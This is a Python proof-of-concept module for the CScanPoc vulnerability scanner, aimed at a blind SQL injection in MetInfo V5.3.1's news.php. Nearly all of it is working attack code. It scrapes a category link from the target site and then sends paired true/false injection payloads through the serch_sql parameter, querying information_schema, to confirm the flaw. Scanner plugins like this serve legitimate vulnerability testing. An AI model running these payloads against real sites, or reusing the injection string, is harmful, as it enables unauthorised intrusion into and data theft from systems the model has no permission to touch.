# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'MetInfo_0015'  # 平台漏洞编号，留空
    name = 'MetInfo V5.3.1 news.php sql注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-06-09'  # 漏洞公布时间
    desc = '''
        MetInfo V5.3.1 news.php 页面参数过滤不严，导致sql注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0119166'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'MetInfo'  # 漏洞应用名称
    product_version = 'V5.3.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'b463df30-3e72-4608-9cb6-a01339ecef79'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer: http://www.wooyun.org/bugs/wooyun-2015-0119166
            hh = hackhttp.hackhttp()
            # 获取classid
            code, head, res, err, _ = hh.http(self.target + '/news/')
            if code != 200:
                return False
            # print res
            m = re.search(
                r'(/news.php\?[a-zA-Z0-9&=]*class[\d]+=[\d]+)[\'"]', res)
            if m == None:
                return False
            # print m.group(1)
            # 注入点
            # 条件真
            payload = self.target + '/news' + \
                m.group(1) + '&serch_sql=as%20a%20join%20information_schema.CHARACTER_SETS%20as%20b%20where%20if(ascii(substr(b.CHARACTER_SET_NAME,1,1))>0,1,0)%20limit%201--%20sd&imgproduct=xxxx'
            # 条件假
            verify = self.target + '/news' + \
                m.group(1) + '&serch_sql=as%20a%20join%20information_schema.CHARACTER_SETS%20as%20b%20where%20if(ascii(substr(b.CHARACTER_SET_NAME,1,1))>255,1,0)%20limit%201--%20sd&imgproduct=xxxx'
            # print payload
            #proxy = ('127.0.0.1', 8887)
            code, head, payload_res, err, _ = hh.http(payload)
            if code != 200:
                return False
            code, head, verify_res, err, _ = hh.http(verify)
            if code != 200:
                return False
            # 判断页面中是否有新闻
            pattern = re.compile(
                r'<h2><a href=[\'"]?[./a-zA-Z0-9_-]*shownews.php\?')
            if pattern.search(payload_res) and pattern.search(verify_res) == None:
                #security_hole(self.target + ' metinfo cms news.php blind sql injection')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
            else:
                return False

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
